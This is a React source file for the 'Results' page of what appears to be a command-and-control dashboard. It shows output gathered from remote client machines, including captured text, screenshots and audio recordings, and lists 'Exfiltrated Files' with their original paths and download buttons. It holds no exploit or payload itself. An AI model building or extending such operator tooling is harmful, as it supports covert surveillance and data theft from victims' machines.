import React, { useState, useEffect } from 'react';
import { api } from '../api';

function Results() {
  const [results, setResults] = useState([]);
  const [selectedResult, setSelectedResult] = useState(null);
  const [loading, setLoading] = useState(true);
  const [capabilities, setCapabilities] = useState({});
  const [files, setFiles] = useState([]);
  const [showFiles, setShowFiles] = useState(false);

  useEffect(() => {
    fetchCapabilities();
    fetchResults();
    fetchFiles();
    const interval = setInterval(() => {
      fetchResults();
      fetchFiles();
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  const fetchCapabilities = async () => {
    try {
      const caps = await api.getCapabilities();
      setCapabilities(caps);
    } catch (error) {
      console.error('Error fetching capabilities:', error);
    }
  };

  const fetchResults = async () => {
    try {
      const data = await api.getResults(50);
      setResults(data.results || []);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching results:', error);
      setLoading(false);
    }
  };

  const fetchFiles = async () => {
    try {
      const data = await api.getFiles();
      setFiles(data.files || []);
    } catch (error) {
      console.error('Error fetching files:', error);
    }
  };

  const decodeBase64 = (str) => {
    try {
      return atob(str);
    } catch {
      return null;
    }
  };

  const renderResultData = (result) => {
    const { result: data, result_type } = result;
    
    if (!data) return <p>No data</p>;

    if (result_type === 'text') {
      const decoded = decodeBase64(data);
      return (
        <div>
          <textarea
            readOnly
            value={decoded || data}
            style={{ 
              width: '100%', 
              minHeight: '200px', 
              fontFamily: 'monospace',
              fontSize: '0.85rem',
              background: '#0d1117',
              color: '#c9d1d9',
              border: '1px solid #30363d',
              borderRadius: '6px',
              padding: '1rem'
            }}
          />
        </div>
      );
    }

    if (result_type === 'image') {
      return (
        <div>
          <img 
            src={`data:image/png;base64,${data}`} 
            alt="Screenshot"
            style={{ maxWidth: '100%', borderRadius: '6px' }}
          />
        </div>
      );
    }

    if (result_type === 'audio') {
      return (
        <div>
          <audio controls style={{ width: '100%' }}>
            <source src={`data:audio/wav;base64,${data}`} />
          </audio>
        </div>
      );
    }

    return (
      <textarea
        readOnly
        value={data.substring(0, 1000)}
        style={{ 
          width: '100%', 
          minHeight: '200px', 
          fontFamily: 'monospace',
          fontSize: '0.85rem'
        }}
      />
    );
  };

  if (loading) {
    return <div className="loading">Loading results...</div>;
  }

  if (selectedResult) {
    return (
      <div>
        <div className="card">
          <button className="btn btn-secondary" onClick={() => setSelectedResult(null)}>
            ← Back to Results
          </button>
          
          <h2 style={{ marginTop: '1rem' }}>Result Details</h2>
          
          <div className="info-block" style={{ marginTop: '1rem' }}>
            <div><strong>Client:</strong> <code>{selectedResult.client}</code></div>
            <div><strong>IP:</strong> {selectedResult.ip}</div>
            <div><strong>Capability:</strong> {capabilities[selectedResult.capability] || `Unknown (${selectedResult.capability})`}</div>
            <div><strong>Type:</strong> {selectedResult.result_type}</div>
            <div><strong>Timestamp:</strong> {new Date(selectedResult.timestamp).toLocaleString()}</div>
          </div>

          <div style={{ marginTop: '1.5rem' }}>
            {renderResultData(selectedResult)}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div>
      <div style={{ marginBottom: '1rem', display: 'flex', gap: '1rem' }}>
        <button 
          className={`btn ${!showFiles ? 'btn-primary' : ''}`} 
          onClick={() => setShowFiles(false)}
        >
          Results ({results.length})
        </button>
        <button 
          className={`btn ${showFiles ? 'btn-primary' : ''}`} 
          onClick={() => setShowFiles(true)}
        >
          Files ({files.length})
        </button>
      </div>

      {showFiles ? (
        <div className="card">
          <h2>Exfiltrated Files ({files.length})</h2>
          
          {files.length === 0 ? (
            <div className="empty-state">
              <p>No files yet</p>
              <small>Exfiltrated files will appear here</small>
            </div>
          ) : (
            <div className="table-container">
              <table className="table">
                <thead>
                  <tr>
                    <th>Time</th>
                    <th>Client</th>
                    <th>Filename</th>
                    <th>Size</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {files.map((file) => (
                    <tr key={file.id}>
                      <td>{new Date(file.timestamp).toLocaleString()}</td>
                      <td><code>{file.client_id}</code></td>
                      <td>
                        <span style={{ fontFamily: 'monospace' }}>{file.filename}</span>
                        {file.original_path && (
                          <small style={{ display: 'block', color: '#8b949e' }}>
                            {file.original_path}
                          </small>
                        )}
                      </td>
                      <td>{(file.file_size / 1024).toFixed(2)} KB</td>
                      <td>
                        <button 
                          className="btn" 
                          onClick={() => api.downloadFile(file.id, file.filename)}
                        >
                          Download
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      ) : (
        <div className="card">
          <h2>Execution Results ({results.length})</h2>
      
      {results.length === 0 ? (
        <div className="empty-state">
          <p>No results yet</p>
          <small>Results will appear here after sending commands</small>
        </div>
      ) : (
        <div className="table-container">
          <table className="table">
            <thead>
              <tr>
                <th>Time</th>
                <th>Client</th>
                <th>Capability</th>
                <th>Type</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {results.map((result, idx) => (
                <tr key={idx}>
                  <td>{new Date(result.timestamp).toLocaleString()}</td>
                  <td><code>{result.client}</code></td>
                  <td>{capabilities[result.capability] || `Unknown (${result.capability})`}</td>
                  <td>
                    {result.result_type === 'text' && '📝 Text'}
                    {result.result_type === 'image' && '🖼️ Image'}
                    {result.result_type === 'audio' && '🔊 Audio'}
                    {!result.result_type && 'Unknown'}
                  </td>
                  <td>
                    <button className="btn" onClick={() => setSelectedResult(result)}>
                      View
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
      )}
    </div>
  );
}

export default Results;
